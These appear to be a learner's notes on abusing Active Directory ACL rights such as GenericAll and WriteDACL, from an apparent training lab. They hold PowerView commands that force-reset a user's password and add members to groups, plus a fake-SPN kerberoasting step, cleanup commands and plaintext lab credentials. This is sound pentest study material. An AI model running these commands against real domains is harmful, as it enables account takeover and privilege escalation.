1. lists that define a) who has access to which asset/resource and 
2. b) the level of access they are provisioned.
### Two types of ACLs:
1. Discretionary Access Control List (DACL): Who gets access to what
2. System access control list (SACL): ==what== gets logged

## Examples of Abuses: 
- `ForceChangePassword` abused with `Set-DomainUserPassword`
	- ==Change a users password without knowing their password!==
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
	- ==This one is big, allowing modification of group membership, change of passwords, or kerberoasting==
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`


## What ACL attacks can be used for:
1. Lateral Movement
2. Privilege escalation
3. Persistence

## ACL Abuse Tactics:

wley:transporter@4
adunn:SyncMaster757

How an attack can work: 
1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

```powershell

$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
# Save the damundsen password for later use (below)

Import-Module .\PowerView.ps1 
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword   -Credential $Cred -Verbose

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen'         -Credential $Cred2 -Verbose
# Add damundsen to the 'Help Desk Level 1' group

```

If you need to, you can make a fake SPN so that you can kerberoast a user (perhaps the user is in use at the time and you do not want to interrupt it)

## Cleanup
In terms of cleanup, there are a few things we need to do:

1. Remove the fake SPN we created on the `adunn` user.
```powershell-session
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
1. Remove the `damundsen` user from the `Help Desk Level 1` group
```powershell-session
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
1. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user